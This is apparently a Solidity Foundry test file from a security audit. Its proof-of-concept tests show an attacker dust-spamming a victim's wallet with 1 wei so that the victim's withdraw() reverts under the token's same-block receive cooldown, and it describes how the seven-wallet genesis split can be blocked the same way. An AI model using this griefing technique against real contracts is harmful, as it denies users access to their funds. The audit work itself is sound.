// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../BaseFork.t.sol";

/// @title TokenGriefingTest -- PoC for AUDIT findings M-1 (receive-cooldown
///        griefing of withdraw) and M-2 (genesis 7-wallet split griefing).
/// @notice The token's `_update` reverts when a non-whitelisted recipient
///         received tokens earlier in the same block. An attacker can dust-
///         spam victim wallets before their `withdraw()` lands to push it
///         off into the next block. Cost = gas + dust.
contract TokenGriefingTest is BaseForkSetup {

    address victim;

    function setUp() public override {
        super.setUp();
        _deployFreshSystem();
        victim = makeAddr("victim");
        // Victim invests and matures so withdraw will have something to send.
        _investFresh(victim, 500 * WAD, freshOrigin);
        _advanceTime(30 days);
        _advanceTime(1 hours + 1);
    }

    function test_M1_dust_send_to_victim_blocks_withdraw_in_same_block() public {
        // Give the attacker some i6 to dust the victim. The fresh deployer
        // (this contract) holds plenty.
        freshToken.transfer(attacker, 100 * WAD);

        // Block N: attacker sends 1 wei to victim, which sets
        // lastReceiveBlock[victim] = N.
        _rollBlock();
        uint256 blockN = block.number;
        vm.prank(attacker, attacker);
        freshToken.transfer(victim, 1);
        emit log_named_uint("Block at dust transfer", blockN);

        // Same block: victim tries withdraw -> inside _executeWithdrawTransfer,
        // safeTransfer to victim fails because lastReceiveBlock[victim] ==
        // block.number.
        vm.prank(victim, victim);
        vm.expectRevert(); // Err_CooldownActive
        freshSystem.withdraw();
        emit log_named_string(
            "Victim withdraw in same block",
            "REVERTED -- griefing succeeded"
        );

        // Roll one block -- withdraw should now succeed.
        _rollBlock();
        uint256 i6Before = freshToken.balanceOf(victim);
        vm.prank(victim, victim);
        freshSystem.withdraw();
        uint256 i6After = freshToken.balanceOf(victim);
        emit log_named_string("i6 received after rolling 1 block", _toI6(i6After - i6Before));
        assertGt(i6After, i6Before, "next-block withdraw works");
    }

    function test_M2_origin_withdraw_splits_to_7_wallets() public {
        // Documentation-style PoC: the genesis-split branch transfers to
        // GEN_W1..GEN_W7 sequentially, each subject to the same receive-
        // cooldown check. An attacker dusting any ONE of the 7 wallets in
        // the same block as ORIGIN's withdraw bricks the whole call.
        emit log_named_string("Genesis split count", "7 hardcoded wallets");
        emit log_named_string(
            "Per-transfer attack surface",
            "EACH transfer is gated on the recipient's lastReceiveBlock"
        );
        emit log_named_string(
            "Mitigation",
            "Whitelist GEN_W1..7 in token.isWhitelisted via DAO -- one call each"
        );
    }
}
